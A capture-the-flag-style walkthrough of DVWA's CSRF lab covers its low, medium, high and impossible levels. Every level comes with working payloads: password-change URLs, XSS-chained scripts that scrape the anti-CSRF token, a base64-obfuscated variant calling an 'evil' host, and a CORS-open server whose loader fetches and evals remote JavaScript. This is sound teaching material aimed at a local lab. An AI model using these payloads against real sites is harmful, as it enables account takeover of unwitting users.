https://github.com/dev-angelist/Writeups-and-Walkthroughs/blob/main/dvwa/csrf.md
# CSRF

What is a Cross-Site Request Forgery (CSRF)?

{% hint style="info" %} Using BurpSuite and the FoxyProxy extension is recommended. {% endhint %}

[![](https://github.com/dev-angelist/Writeups-and-Walkthroughs/raw/main/.gitbook/assets/image%20(58).png)](https://github.com/dev-angelist/Writeups-and-Walkthroughs/blob/main/.gitbook/assets/image%20\(58\).png)

[https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)

{% embed url="[https://owasp.org/www-community/attacks/csrf](https://owasp.org/www-community/attacks/csrf)" %} [https://owasp.org/www-community/attacks/csrf](https://owasp.org/www-community/attacks/csrf) {% endembed %}

{% embed url="[https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)" %} [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf) {% endembed %}

## Low

[](https://github.com/dev-angelist/Writeups-and-Walkthroughs/blob/main/dvwa/csrf.md#low)

We've a form with two input type text:

[![](https://github.com/dev-angelist/Writeups-and-Walkthroughs/raw/main/.gitbook/assets/image%20(57).png)](https://github.com/dev-angelist/Writeups-and-Walkthroughs/blob/main/.gitbook/assets/image%20\(57\).png)

that ask us to change admin password entering new password and confirming it.

As always we can start to analyze source code:

[![](https://github.com/dev-angelist/Writeups-and-Walkthroughs/raw/main/.gitbook/assets/image%20(59).png)](https://github.com/dev-angelist/Writeups-and-Walkthroughs/blob/main/.gitbook/assets/image%20\(59\).png)

- There'is a condition to check if input value has been inserted
- Check if the two passwords match
- If there're the same, change admin psw.

{% hint style="warning" %} The input is not sanitized, so I can execute any (potentially malicious) command. {% endhint %}

Considering that GET request to change psw is this

[![](https://github.com/dev-angelist/Writeups-and-Walkthroughs/raw/main/.gitbook/assets/image%20(60).png)](https://github.com/dev-angelist/Writeups-and-Walkthroughs/blob/main/.gitbook/assets/image%20\(60\).png)

we can use and insert it in a URL to send at victim usually using social engineering techniques.

#### Payload

[](https://github.com/dev-angelist/Writeups-and-Walkthroughs/blob/main/dvwa/csrf.md#payload)

```shell
localhost/DVWA/vulnerabilities/csrf/?password_new=password1&password_conf=password1&Change=Change#
```

using it, we can change password to a different password (password1) only opening payload URL via browser.

[![](https://github.com/dev-angelist/Writeups-and-Walkthroughs/raw/main/.gitbook/assets/image%20(61).png)](https://github.com/dev-angelist/Writeups-and-Walkthroughs/blob/main/.gitbook/assets/image%20\(61\).png)

the same payload can be injected in a javascript code stored in another web page, but it can't work if the website used a **CORS** mechanism (Cross-origin resource sharing).

Cross-origin resource sharing (CORS)

## Medium

[](https://github.com/dev-angelist/Writeups-and-Walkthroughs/blob/main/dvwa/csrf.md#medium)

[![](https://github.com/dev-angelist/Writeups-and-Walkthroughs/raw/main/.gitbook/assets/image%20(199).png)](https://github.com/dev-angelist/Writeups-and-Walkthroughs/blob/main/.gitbook/assets/image%20\(199\).png)

- There's a classic control of input text submitted
- Check if the HTTP_REFERER request has the same name and origin of name server (request isn't sent by an external source)
- Check the match between the new password and the confirmation password
- In the end, there's generate feedback for the end user.

[![](https://github.com/dev-angelist/Writeups-and-Walkthroughs/raw/main/.gitbook/assets/image%20(200).png)](https://github.com/dev-angelist/Writeups-and-Walkthroughs/blob/main/.gitbook/assets/image%20\(200\).png)

If the HTTP_REFERER is the same of the server name: csrf in our case, there're not problem;

while, using the same payload of level low (that has a different origin), HTTP_REFERER link is not generated and we can't change password.

```ini
localhost/DVWA/vulnerabilities/csrf/?password_new=password1&password_conf=password1&Change=Change#
```

[![](https://github.com/dev-angelist/Writeups-and-Walkthroughs/raw/main/.gitbook/assets/image%20(201).png)](https://github.com/dev-angelist/Writeups-and-Walkthroughs/blob/main/.gitbook/assets/image%20\(201\).png)

#### Payload

[](https://github.com/dev-angelist/Writeups-and-Walkthroughs/blob/main/dvwa/csrf.md#payload-1)

To exploit it, is necessary have an HTTP_REFERER request with the same name server, then we can use XSS Reflected attack redirecting the attacker to the desired page, where it's run a malicious javascript code.

We can try to inject an example of javascript code such as:

```html
<Script> alert("Hello World"); </Script>
```

into XSS Reflected section\

[![](https://github.com/dev-angelist/Writeups-and-Walkthroughs/raw/main/.gitbook/assets/image%20(202).png)](https://github.com/dev-angelist/Writeups-and-Walkthroughs/blob/main/.gitbook/assets/image%20\(202\).png)

[![](https://github.com/dev-angelist/Writeups-and-Walkthroughs/raw/main/.gitbook/assets/image%20(203).png)](https://github.com/dev-angelist/Writeups-and-Walkthroughs/blob/main/.gitbook/assets/image%20\(203\).png)

Very well, using this XSS we can trigger the malicious password change request with the following XSS script:

```html
<Script> var xmlHttp = new XMLHttpRequest(); var url = "http://localhost/DVWA//vulnerabilities/csrf/?password_new=newpass&password_conf=newpass&Change=Change"; xmlHttp.open("GET", url, false); xmlHttp.send(null); </Script>
```

[![](https://github.com/dev-angelist/Writeups-and-Walkthroughs/raw/main/.gitbook/assets/image%20(206).png)](https://github.com/dev-angelist/Writeups-and-Walkthroughs/blob/main/.gitbook/assets/image%20\(206\).png)

It usually need to convert URL-encode key characters and we can redirect user to localhost/DVWA page;

[![](https://github.com/dev-angelist/Writeups-and-Walkthroughs/raw/main/.gitbook/assets/image%20(209).png)](https://github.com/dev-angelist/Writeups-and-Walkthroughs/blob/main/.gitbook/assets/image%20\(209\).png)

Upon obtaining the HTTP_REFERER source (1st GET request), all javascript codes are accepted, then the password is changed (2st GET request).

{% hint style="warning" %} Only checking if the HTTP_REFERER request has the same name and origin of name server we can't be sure that request is valid, because can be redirect using XSS Reflected attack. {% endhint %}

## High

[](https://github.com/dev-angelist/Writeups-and-Walkthroughs/blob/main/dvwa/csrf.md#high)

[![](https://github.com/dev-angelist/Writeups-and-Walkthroughs/raw/main/.gitbook/assets/image%20(208).png)](https://github.com/dev-angelist/Writeups-and-Walkthroughs/blob/main/.gitbook/assets/image%20\(208\).png)

- Generation and checking of Anti-CSRF token (in our case called user_token), that will be regenerated for every request or page refresh

[![](https://github.com/dev-angelist/Writeups-and-Walkthroughs/raw/main/.gitbook/assets/image%20(210).png)](https://github.com/dev-angelist/Writeups-and-Walkthroughs/blob/main/.gitbook/assets/image%20\(210\).png)

- Check the match between the new password and the confirmation password
- Take a real escape string
- In the end, there's generate feedback for the end user.

To fix the first problem, we realize that for solving the high reflective XSS level we need the following payload

```html
<img src='#' onerror=alert(1) />
```

Even like this, if we just put the previous payload,

```html
<Script> var xmlHttp = new XMLHttpRequest(); var url = "http://evil/vulnerabilities/csrf/?password_new=newpass&password_conf=newpass&Change=Change"; xmlHttp.open("GET", url, false); xmlHttp.send(null); </Script>
```

which has to be base64d and decoded with the `atob` function otherwise we get blocked, it won’t work because of the CSRF code.

```html
<img src='#' onerror="var xmlHttp = new XMLHttpRequest(); xmlHttp.open('GET', atob('aHR0cDovL2V2aWwvdnVsbmVyYWJpbGl0aWVzL2NzcmYvP3Bhc3N3b3JkX25ldz1uZXdwYXNzJnBhc3N3b3JkX2NvbmY9bmV3cGFzcyZDaGFuZ2U9Q2hhbmdl'), false); xmlHttp.send(null);" />
```

The idea then is to first do a GET request, extract the CSRF code, and then send it in the URL. In particular, we want to create the following URL

```html
GET /vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change&user_token=6bed618fc0eaf44857bfa115c4c61a79
```

where `user_token` was obtained from a previous GET request to CSRF change password page. To create such URL we first experiment with JS code that is able to extract the `user_token` from the webpage in order to craft a valid GET request for changing the password of the user with a custom password. The following JS code does the job.

#### Payload

[](https://github.com/dev-angelist/Writeups-and-Walkthroughs/blob/main/dvwa/csrf.md#payload-2)

```js
var newpass = "test"
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://localhost/DVWA/vulnerabilities/csrf/', false);
xhr.onload = function() {
    var doc = new DOMParser().parseFromString(this.responseText, "text/xml");
    var csrf = doc.getElementsByName("user_token")[0].getAttribute("value");
    var xhr2 = new XMLHttpRequest();    
    xhr2.open('GET', `http://localhost/DVWA/vulnerabilities/csrf/?password_new=${newpass}&password_conf=${newpass}&Change=Change&user_token=${csrf}`, false);
    xhr2.send(null);
};
xhr.send(null);
```

We save this payload onto a file called `high.js`.

Now we need to find a way to execute this JS payload onto the victim browser. To avoid the block of the hard challenge of the reflected XSS, the idea is to write a small loader that loads a much bigger javascript file and executes it with eval. We can load this file by creating a malicious server which disables CORS checks. The code for such server is shown below

```python
#!/usr/bin/env python3

from http.server import HTTPServer, SimpleHTTPRequestHandler, test
import sys

class CORSRequestHandler (SimpleHTTPRequestHandler):
    def end_headers (self):
        self.send_header('Access-Control-Allow-Origin', '*')
        SimpleHTTPRequestHandler.end_headers(self)

if __name__ == '__main__':
    test(CORSRequestHandler, HTTPServer, port=int(sys.argv[1]) if len(sys.argv) > 1 else 8000)
```

We save that in `high-cors-server.py` and then execute it as follows

```shell
python3 high-cors-server.py
```

Once we have that running, we can use the following payload on the high reflected XSS challenge page of DVWA

```html
<img src='#' onerror="var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://localhost:8000/high.js', false); xhr.onload = function () {eval(this[atob('cmVzcG9uc2VUZXh0')])}; xhr.send(null); " />
```

This payload is encoded into the following GET request.

```ini
http://localhost/DVWA/vulnerabilities/xss_r/?name=%3Cimg+src%3D%27%23%27+onerror%3D%22var+xhr+%3D+new+XMLHttpRequest%28%29%3B+xhr.open%28%27GET%27%2C+%27http%3A%2F%2Flocalhost%3A8000%2Fhigh.js%27%2C+false%29%3B+xhr.onload+%3D+function+%28%29+%7Beval%28this%5Batob%28%27cmVzcG9uc2VUZXh0%27%29%5D%29%7D%3B+xhr.send%28null%29%3B+%22+%2F%3E
```

by changing the `newpass` of the `high.js` script, we will control the password of the authenticated user who clicks on the previous link. In particular, when the user clicks on the link, the following things will happen:

- The reflective XSS on the DVWA page is triggered, executing the malicious js within the victim browser.
- The malicious js does a GET to the endpoint [http://localhost:8000/high.js](http://localhost:8000/high.js) and performs an `eval` on the obtained text from the server.
- The javascript code loaded performs two GETs. One to obtian the CSRF code from the DVWA change password page, and the second to set a new password using the previous CSRF token.
- As soon as the second GET hits the server, the password of the user is changed by the server.

{% hint style="warning" %} Using two XSS requests we can redirect user to the same origin of name server and we can't be sure that request is valid. {% endhint %}

## Impossible

[](https://github.com/dev-angelist/Writeups-and-Walkthroughs/blob/main/dvwa/csrf.md#impossible)

[![](https://github.com/dev-angelist/Writeups-and-Walkthroughs/raw/main/.gitbook/assets/image%20(211).png)](https://github.com/dev-angelist/Writeups-and-Walkthroughs/blob/main/.gitbook/assets/image%20\(211\).png)

In this case there's a new input text: Current password, an info unknown by attacker that using others controls, prevents CSRF attack.

[![](https://github.com/dev-angelist/Writeups-and-Walkthroughs/raw/main/.gitbook/assets/image%20(212).png)](https://github.com/dev-angelist/Writeups-and-Walkthroughs/blob/main/.gitbook/assets/image%20\(212\).png)

{% hint style="info" %} Site isn't vulnerable to CSRF attack because the request includes info that the attacker cannot have access to. {% endhint %}

## References

[](https://github.com/dev-angelist/Writeups-and-Walkthroughs/blob/main/dvwa/csrf.md#references)

For the making of this solution the following resource were used:

- [https://stackoverflow.com/questions/21956683/enable-access-control-on-simple-http-server](https://stackoverflow.com/questions/21956683/enable-access-control-on-simple-http-server)
- [https://labs.withsecure.com/publications/getting-real-with-xss](https://labs.withsecure.com/publications/getting-real-with-xss)
- [https://github.com/LeonardoE95/DVWA/tree/main/src/client_side_request_forgery](https://github.com/LeonardoE95/DVWA/tree/main/src/client_side_request_forgery)
- [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
- [https://owasp.org/www-community/attacks/csrf](https://owasp.org/www-community/attacks/csrf)